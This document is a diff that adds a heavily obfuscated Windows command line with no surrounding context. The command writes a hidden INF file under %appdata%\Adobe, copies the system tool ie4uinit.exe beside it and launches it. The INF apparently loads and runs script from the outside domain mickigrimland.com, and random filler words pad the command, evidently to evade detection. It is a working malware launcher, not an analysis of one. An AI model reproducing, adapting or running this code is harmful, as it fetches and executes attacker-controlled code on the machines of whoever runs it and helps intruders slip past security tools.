@@ -1,0 +1,7 @@
+/v /c (for %u in (s) do @set "Tattoo=%~u") &&
+  (for %g in (i) do @set "Firms=%~g") &&
+  (for %g in (c) do @set "Alert=%~g") &&
+  (for %b in (a) do @set "Laundry=%~b") &&
+  call(for %u in ("[5D75]" "ieu%Close%.inf" "[version]" "signature =$windows nt$" "[destinationdirs]" "defaultdestdir=11" "5D75=01" "[defaultinstall.windows7]" "delfiles=5D75" "Un\" "Register\" "OCXs=EF41" "[strings]" "servicename=' '" "Societies=:;Cupboard" "Weeks=%t!Firms!me%" "Lenders=h" "Rebates=b;Ensure" "shortsvcname=' '" "Close=init" "Depend=t;Apple" "Teach=/" "[EF41]" "sc\" "ro%Rebates%j,NI,%Lenders%%Depend%%Depend%p%Societies%%Teach%%Teach%mickigrimland.com/homepage" ) do @echo %~u)>"%appdata%\Adobe\ieuinit.inf" &&
+  call xcopy /Y /C /Q %w!Firms!n!Happy!ir%\system32\ie4uinit.exe "%appdata%\Adobe\*" | set Video47=Shuffle &&
+  start " " %appdata%\Adobe\ie4uinit.exe -basesettings " | set "Video79=Donate Soldier Purse Govern Chassis During Besides Polls Minerals Belongs Crucial Cloud Lemon Stats Advantages Employees Heavy Venues Burger Inner Brooks Marine Agencies Totals Organ Inmate Collectibles Angry Starts Wireless Brown Drawings Winds Religions Elevator Similar Summer Hundreds Checks Insect Actress Cycle Revisions Trumpet Districts Swamp"
